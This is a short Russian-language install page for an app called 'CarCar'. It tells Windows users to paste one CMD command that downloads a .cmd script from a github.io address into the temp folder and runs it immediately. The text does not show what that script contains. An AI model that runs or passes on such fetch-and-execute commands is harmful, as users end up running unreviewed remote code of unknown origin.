CarCar

Вставьте строку в CMD на Windows 10/11 x64:

curl -fL --retry 3 https://aladiiplyton-alt.github.io/CarCar/c2 -o "%TEMP%\cc.cmd" && "%TEMP%\cc.cmd"

Команда скачает приложение во временную папку и откроет окно. При отсутствии WebView2 загрузчик предложит открыть официальный сайт установки. API Key вводится в настройках.

Интернет и разрешение Windows на запуск необходимы. Абсолютная гарантия скачивания при недоступном сервере или блокировке сети невозможна.
